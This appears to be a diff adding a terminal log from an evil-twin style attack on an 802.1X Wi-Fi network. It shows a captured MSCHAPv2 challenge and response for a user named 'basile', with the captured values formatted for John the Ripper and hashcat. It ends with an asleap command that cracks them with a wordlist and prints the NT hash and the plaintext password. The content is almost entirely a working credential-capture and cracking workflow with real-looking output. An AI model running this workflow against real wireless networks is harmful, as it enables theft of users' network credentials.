@@ -1,0 +1,29 @@
+mschapv2: Thu Aug  8 15:41:41 2019
+	 username:	basile
+	 challenge:	9c:15:e6:cf:36:7c:3f:95
+	 response:	f7:1c:26:d0:ae:25:be:11:20:3a:38:40:81:54:71:c8:5b:8d:bd:03:bc:c6:05:15
+	 jtr NETNTLM:		basile:$NETNTLM$9c15e6cf367c3f95$f71c26d0ae25be11203a3840815471c85b8dbd03bcc60515
+	 hashcat NETNTLM:	basile::::f71c26d0ae25be11203a3840815471c85b8dbd03bcc60515:9c15e6cf367c3f95
+wlan0: STA 34:8a:7b:ba:32:8a IEEE 802.1X: Identity received from STA: 'basile'
+wlan0: STA 34:8a:7b:ba:32:8a IEEE 802.1X: Identity received from STA: 'basile'
+wlan0: CTRL-EVENT-EAP-FAILURE 34:8a:7b:ba:32:8a
+wlan0: STA 34:8a:7b:ba:32:8a IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 34:8a:7b:ba:32:8a IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 34:8a:7b:ba:32:8a IEEE 802.11: deauthenticated due to local deauth request
+^C
+
+quit
+^Cwlan0: interface state ENABLED->DISABLED
+wlan0: AP-DISABLED 
+wlan0: CTRL-EVENT-TERMINATING 
+nl80211: deinit ifname=wlan0 disabled_11b_rates=0
+(base) root@basile-n73jf-2:~# cat /usr/share/wordlists/fasttrack.txt | asleap -C 9c:15:e6:cf:36:7c:3f:95 -R f7:1c:26:d0:ae:25:be:11:20:3a:38:40:81:54:71:c8:5b:8d:bd:03:bc:c6:05:15 -W -
+asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+Using STDIN for words.
+	hash bytes:        18d4
+	NT hash:           32ed87bdb5fdc5e9cba88547376818d4
+	password:          123456
+(base) root@basile-n73jf-2:~# 
+
+
+
